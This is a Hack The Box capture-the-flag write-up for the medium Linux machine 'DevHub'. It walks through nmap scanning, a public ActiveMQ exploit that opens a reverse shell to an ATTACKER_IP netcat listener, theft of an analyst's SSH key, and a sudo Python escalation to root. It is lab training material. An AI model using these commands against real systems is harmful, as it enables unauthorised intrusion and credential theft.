
# DevHub - Hack The Box (Medium)

# DevHub

## Machine Information

- **Platform:** Hack The Box
- **Difficulty:** Medium
- **OS:** Linux
- **Status:** Owned

---

# Enumeration

## Nmap

Initial scan:

```bash
nmap -p- -sC -sV -Pn <TARGET_IP> -oN nmap


![image alt](https://github.com/Eliaspaz2/HTB-Writeups/blob/e78f425ce7adafb9afd0be0c0d3cf803bd42ef9b/Medium/Devhub/01-nmap-devhub.png)



```

Interesting ports discovered:

| Port | Service |
|------|----------|
| 22 | SSH |
| 80 | HTTP |
| 6274 (MSP/Apache ActiveMQ) | Web Management Console |

The web application itself did not expose anything useful, but the management interface running on **Apache ActiveMQ** revealed its exact version.

---

# Version Enumeration

Navigating through the administration interface exposed the software version.

Searching public exploits revealed that this version was vulnerable to a publicly available Remote Code Execution vulnerability.

The exploit abuses the ActiveMQ API to upload and execute arbitrary files, ultimately allowing command execution on the server.

---

# Initial Access

A public Python exploit was used against the vulnerable ActiveMQ instance.

After starting a listener:

```bash
nc -lvnp 4444
```

The exploit was executed:

```bash
python3 exploit.py \
--target http://<TARGET_IP>:6274 \
--lhost <ATTACKER_IP> \
--lport 4444
```

The exploit successfully returned a reverse shell.

---

# Shell Stabilization

The initial shell was upgraded.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell:

```
CTRL + Z
```

On Kali:

```bash
stty raw -echo
fg
reset
```

Then:

```bash
export TERM=xterm
stty rows 50 columns 150
```

---

# Local Enumeration

Performed standard enumeration:

```bash
id
hostname
sudo -l
find / -perm -4000 -type f 2>/dev/null
ss -tulpn
ps aux
```

Nothing immediately exploitable appeared.

Further manual enumeration identified another local user:

```
analyst
```

---

# Lateral Movement

At this stage I needed assistance reviewing public documentation to understand the intended attack path.

The local machine exposed an internal API used by the analyst account.

After reviewing the functionality of that API, it became possible to retrieve the analyst user's SSH private key.

Once the private key was obtained:

```bash
chmod 600 analyst_id_rsa
```

SSH access:

```bash
ssh -i analyst_id_rsa analyst@<TARGET_IP>
```

Successfully authenticated as:

```
analyst
```

---

# Privilege Escalation

After enumerating the analyst account:

```bash
sudo -l
```

The account was allowed to execute a privileged Python application through sudo.

The application could be abused to execute arbitrary commands as root.

After modifying the execution flow and spawning a shell:

```bash
sudo python3 vulnerable_script.py
```

A root shell was obtained.

Verification:

```bash
id
```

Output:

```
uid=0(root)
```

---

# Flags

User:

```text
******************************
```

Root:

```text
******************************
```

---

# Lessons Learned

## Enumeration

- Always inspect management dashboards.
- Product versions often directly reveal public CVEs.

## Initial Access

- Public exploits should always be validated manually.
- Reverse shell exploits frequently require only minor modifications.

## Local Enumeration

- Even if privilege escalation is not immediately possible, enumerate every user.
- Internal services often become attack vectors after initial compromise.

## Lateral Movement

- Internal APIs can expose sensitive credentials.
- SSH keys are frequently easier to abuse than passwords.

## Privilege Escalation

- Always inspect sudo permissions carefully.
- Custom Python applications executed as root deserve thorough review.

---

# Tools Used

- Nmap
- Netcat
- Python
- SSH
- ActiveMQ Public Exploit
- LinPEAS (optional)
- Manual Enumeration

---

# Attack Chain

```
Nmap
        ↓
Apache ActiveMQ Version Enumeration
        ↓
Public CVE
        ↓
Python Exploit
        ↓
Reverse Shell
        ↓
Shell Stabilization
        ↓
Internal Enumeration
        ↓
API Abuse
        ↓
Extract Analyst SSH Key
        ↓
SSH as analyst
        ↓
Abuse sudo Python Program
        ↓
Root
```

# Notes

This machine focused heavily on:

- Proper service enumeration
- Version identification
- Exploit validation
- Internal API abuse
- Lateral movement
- Privilege escalation through misconfigured sudo permissions

The most valuable lesson from this machine was understanding that obtaining an initial shell is often only the beginning. Careful enumeration of internal services and users ultimately led to full compromise.
